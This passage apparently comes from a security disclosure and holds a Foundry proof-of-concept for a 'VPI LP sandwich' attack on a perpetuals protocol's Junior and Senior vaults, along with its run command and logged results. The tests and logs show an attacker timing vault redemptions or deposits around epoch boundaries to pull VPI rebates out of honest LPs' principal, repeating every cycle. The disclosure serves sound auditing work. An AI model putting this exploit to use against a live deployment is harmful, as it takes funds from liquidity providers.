        uint256 newLpEnd = juniorVault.convertToAssets(juniorVault.balanceOf(carol));
        uint256 honestEnd = _honestValue() + newLpEnd;
        uint256 honestBasis = honestStart + carolDeposit;
        uint256 attackerGain = uint256(_attackerNetWealth() - attackerStart);
        console2.log("depth at open            ", depthAtOpen);
        console2.log("depth at close           ", depthAtClose);
        console2.log("honest LPs basis         ", honestBasis);
        console2.log("honest LPs end           ", honestEnd);
        console2.log("honest LPs loss          ", honestBasis - honestEnd);
        console2.log("new LP deposited         ", carolDeposit);
        console2.log("new LP value at entry    ", newLpAtEntry);
        console2.log("new LP value end         ", newLpEnd);
        console2.log("new LP loss              ", carolDeposit - newLpEnd);
        console2.log("attacker net gain        ", attackerGain);

        assertGe(depthAtClose, depthAtOpen, "close depth is not below open depth");
        assertLt(honestEnd, honestBasis, "honest LPs lost principal");
        assertLt(newLpEnd, carolDeposit, "new LP paid part of an older position's rebate");
        assertGt(attackerGain, 0, "attacker profited");
    }

    /// @dev Deposit-side mirror: with skew from an honest trader, the attacker's skew-reducing open receives a VPI
    ///      rebate out of Junior NAV, its Junior deposit settles at the lowered NAV, and the close charges the VPI back
    ///      into NAV that the attacker now partly owns.
    function test_VpiLpSandwich_MirrorDepositSide() public {
        address dave = address(0xDA7E); // honest trader
        uint256 lots = pool.totalAssets() * 38 / 100 / 100e6;
        uint256 daveMargin = lots * 100e6 * 250 / 10_000;
        settlementToken.mint(dave, daveMargin + 100e6);
        vm.startPrank(dave);
        settlementToken.approve(address(clearinghouse), daveMargin + 100e6);
        clearinghouse.deposit(dave, daveMargin + 100e6);
        vm.stopPrank();
        _commitAndExecute(dave, KEEPER, CfdTypes.Side.LONG, lots * LOT, daveMargin, false);

        vm.warp(_epochStart(vm.getBlockTimestamp()) + 1 hours + 600);
        _refreshMark();
        uint256 honestStart = _honestValue();
        int256 attackerStart = _attackerNetWealth();

        // 1. Queue an attacker Junior deposit for the next boundary.
        _ensureAttackerWallet(_attackerJunior());
        vm.startPrank(ATTACKER);
        settlementToken.approve(address(juniorVault), _attackerJunior());
        uint256 depositId = juniorVault.requestDeposit(_attackerJunior(), ATTACKER, ATTACKER);
        vm.stopPrank();

        // 2. One minute before the boundary, open a SHORT that flattens the skew; its VPI rebate leaves Junior NAV.
        vm.warp(_epochStart(vm.getBlockTimestamp()) + 1 hours - 60);
        _refreshMark();
        uint256 margin = lots * 100e6 * 250 / 10_000;
        _ensureAttackerMargin(margin + 100e6);
        _commitAndExecute(ATTACKER, ATTACKER, CfdTypes.Side.SHORT, lots * LOT, margin, false);
        (,,,,,, int256 vpiAccrued) = engine.positions(ATTACKER);

        // 3. The deposit settles at the lowered NAV.
        vm.warp(_epochStart(vm.getBlockTimestamp()) + 1 hours + 1);
        _settleEpochAs(ATTACKER);
        uint256 claimable = juniorVault.claimableDepositRequest(depositId, ATTACKER);
        vm.prank(ATTACKER);
        juniorVault.claimDeposit(depositId, claimable, ATTACKER, ATTACKER);

        // 4. Close the SHORT; the clawback restores Junior NAV, now shared with the attacker's new shares.
        _commitAndExecute(ATTACKER, ATTACKER, CfdTypes.Side.SHORT, lots * LOT, 0, true);
        _refreshMark();

        uint256 honestEnd = _honestValue();
        uint256 attackerGain = uint256(_attackerNetWealth() - attackerStart);
        console2.log("open VPI rebate          ", uint256(-vpiAccrued));
        console2.log("honest LP value start    ", honestStart);
        console2.log("honest LP value end      ", honestEnd);
        console2.log("honest LP loss           ", honestStart - honestEnd);
        console2.log("attacker net gain        ", attackerGain);
        assertLt(vpiAccrued, 0, "the flattening open received a VPI rebate");
        assertLt(honestEnd, honestStart, "honest LP lost principal");
        assertGt(attackerGain, 0, "attacker profited");
    }

    /// @dev Control: the identical open/close round trip across the same boundary without the attacker's redemption.
    function test_Control_SameRoundTripWithoutRedemption() public {
        _becomeLp();
        uint256 honestStart = _honestValue();
        int256 attackerStart = _attackerNetWealth();
        (uint256 size,) = _openNearBoundary();
        vm.warp(_epochStart(vm.getBlockTimestamp()) + 1 hours + 1);
        _commitAndExecute(ATTACKER, ATTACKER, CfdTypes.Side.LONG, size, 0, true);
        _refreshMark();
        uint256 honestEnd = _honestValue();
        int256 attackerEnd = _attackerNetWealth();
        assertGe(honestEnd, honestStart, "control: honest LP does not lose");
        assertLt(attackerEnd, attackerStart, "control: the round trip alone costs the attacker");
        console2.log("control honest LP gain   ", honestEnd - honestStart);
        console2.log("control attacker loss    ", uint256(attackerStart - attackerEnd));
    }

}

/// @dev Same tests with an honest Senior LP of 3_130_000 USDG and attacker Junior capital of 5_670_000 USDG.
contract VpiLpSandwichWithSeniorTest is VpiLpSandwichTest {

    function _attackerJunior() internal pure override returns (uint256) {
        return 5_670_000e6;
    }

    function _honestSenior() internal pure override returns (uint256) {
        return 3_130_000e6;
    }

    /// @dev Every Pyth feed publishes the widest confidence the release oracle accepts (10 bps, PletherOracle.sol:869),
    ///      so each attacker execution pays the maximum adverse shift (25% of confidence, PletherOracle.sol:905-923).
    function test_VpiLpSandwich_WidestAcceptedConfidence() public {
        confidenceBps = 10;
        _becomeLp();
        uint256 honestStart = _honestValue();
        int256 attackerStart = _attackerNetWealth();
        _sandwich();
        _refreshMark();
        uint256 honestEnd = _honestValue();
        uint256 attackerGain = uint256(_attackerNetWealth() - attackerStart);
        console2.log("honest LP value start    ", honestStart);
        console2.log("honest LP value end      ", honestEnd);
        console2.log("honest LP loss           ", honestStart - honestEnd);
        console2.log("attacker net gain        ", attackerGain);
        assertLt(honestEnd, _honestPrincipal(), "honest LPs end below their deposited principal");
        assertGt(attackerGain, 0, "attacker profited");
    }

}
```

run from `packages/perps`:

```bash
forge test --match-path test/poc/VpiLpSandwich.t.sol -vv
```

output:

```bash
Ran 6 tests for test/poc/VpiLpSandwich.t.sol:VpiLpSandwichWithSeniorTest
[PASS] test_Control_SameRoundTripWithoutRedemption() (gas: 5631356)
Logs:
  control honest LP gain    244370412
  control attacker loss     1733970640
[PASS] test_VpiLpSandwich_CloseDepthNotBelowOpenDepth() (gas: 6973739)
Logs:
  depth at open             9807077598556
  depth at close            9901111383056
  honest LPs basis          9900028342410
  honest LPs end            9895595770654
  honest LPs loss           4432571756
  new LP deposited          5770000000000
  new LP value at entry     5769999999999
  new LP value end          5765301503757
  new LP loss               4698496243
  attacker net gain         2942971507
[PASS] test_VpiLpSandwich_HonestLpLosesAttackerGains() (gas: 6507265)
Logs:
  honest LP principal       4130000000000
  pool depth at start       9800002000000
  position notional         3724000000000
  open VPI                  7075598556
  Junior NAV rise on open   7075590616
  attacker LP value pre-open 5669971657593
  attacker redeemed assets  5675966215500
  honest LP value start     4130028342410
  honest LP value end       4125523522826
  honest LP loss            4504819584
  attacker net gain         3015224097
  treasury fees             1489600000
[PASS] test_VpiLpSandwich_MirrorDepositSide() (gas: 7947406)
Logs:
  open VPI rebate           2979707209
  honest LP value start     4132981855592
  honest LP value end       4130448884792
  honest LP loss            2532970800
  attacker net gain         1277453345
[PASS] test_VpiLpSandwich_RepeatsEveryCycle() (gas: 28011952)
Logs:
  cycle honest loss         4504819584
  cycle honest loss         4506572987
  cycle honest loss         4508613900
  cycle honest loss         4510659744
  cycle honest loss         4512710541
  attacker capital minted   5763200000000
  honest LP value start     4129999999990
  honest LP value end       4107598537452
  honest LP loss, 5 cycles  22401462538
  attacker gain, 5 cycles   14960445189
[PASS] test_VpiLpSandwich_WidestAcceptedConfidence() (gas: 6342325)
Logs:
  honest LP value start     4130028342410
  honest LP value end       4126597478053
  honest LP loss            3430864357
  attacker net gain         1941640198
Suite result: ok. 6 passed; 0 failed; 0 skipped; finished in 76.25ms (134.19ms CPU time)
Ran 5 tests for test/poc/VpiLpSandwich.t.sol:VpiLpSandwichTest
[PASS] test_Control_SameRoundTripWithoutRedemption() (gas: 5631335)
Logs:
  control honest LP gain    152533984
  control attacker loss     517334144
[PASS] test_VpiLpSandwich_CloseDepthNotBelowOpenDepth() (gas: 6972560)
Logs:
  depth at open             2401734798556
  depth at close            2500723999830
  honest LPs basis          2499999999986
  honest LPs end            2499423825254
  honest LPs loss           576174732
  new LP deposited          1500000000000
  new LP value at entry     1499999999999
  new LP value end          1499221320585
  new LP loss               778679415
  attacker net gain         211374522
[PASS] test_VpiLpSandwich_HonestLpLosesAttackerGains() (gas: 6505801)
Logs:
  honest LP principal       1000000000000
  pool depth at start       2400002000000
  position notional         912000000000
  open VPI                  1732798556
  Junior NAV rise on open   1732798556
  attacker LP value pre-open 1399999999994
  attacker redeemed assets  1401010798726
  honest LP value start     999999999986
  honest LP value end       999354034674
  honest LP loss            645965312
  attacker net gain         281165949
  treasury fees             364800000
[PASS] test_VpiLpSandwich_MirrorDepositSide() (gas: 7947901)
Logs:
  open VPI rebate           721477651
  honest LP value start     1000721997825
  honest LP value end       1000301142031
  honest LP loss            420855794
  attacker net gain         116856206
[PASS] test_VpiLpSandwich_RepeatsEveryCycle() (gas: 28027585)
Logs:
  cycle honest loss         645965312
  cycle honest loss         645964411
  cycle honest loss         646145221
  cycle honest loss         646144403
  cycle honest loss         646325411
  attacker capital minted   1422900000000
  honest LP value start     999999999999
  honest LP value end       996769455176
  honest LP loss, 5 cycles  3230544823
  attacker gain, 5 cycles   1407587913
Suite result: ok. 5 passed; 0 failed; 0 skipped; finished in 77.13ms (119.66ms CPU time)
Ran 2 test suites in 84.90ms (153.38ms CPU time): 11 tests passed, 0 failed, 0 skipped (11 total tests)
```

`test_VpiLpSandwich_HonestLpLosesAttackerGains` shows the redemption capturing 1_010.80 USDG of the attacker's own VPI, the honest LP ending 645.97 USDG below its deposit and the loss reconciling to the attacker and the treasury. `test_VpiLpSandwich_RepeatsEveryCycle` shows the loss repeating with no new attacker capital. `test_VpiLpSandwich_CloseDepthNotBelowOpenDepth` shows the loss without any reduction in pool depth and a new LP paying 778.68 USDG of an older position's rebate. `test_VpiLpSandwich_MirrorDepositSide` shows the deposit-side variant. `test_VpiLpSandwich_WidestAcceptedConfidence` shows the attack at the widest oracle confidence. `test_Control_SameRoundTripWithoutRedemption` shows that the same trades without the redemption leave the honest LP better off.
